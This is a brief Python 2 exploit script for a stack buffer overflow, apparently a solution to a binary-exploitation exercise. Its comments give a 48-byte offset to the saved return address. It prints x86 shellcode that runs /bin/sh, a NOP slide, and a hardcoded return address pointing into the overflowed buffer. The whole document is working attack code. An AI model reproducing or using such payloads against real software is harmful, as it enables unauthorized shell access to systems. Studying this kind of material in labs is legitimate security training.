#!/usr/bin/python

import struct

# padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL"
# The necessary padding to reach the eip position in the stack is 48 bytes.
# Fill up this space with the payload which is 21 bytes and use nop instruction
# for the 27 bytes remaining.
eip = struct.pack("I", 0x80dacc0) # Address of Name as a binary string
nopSlide = "\x90" * 27
payload = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

print payload + nopSlide + eip
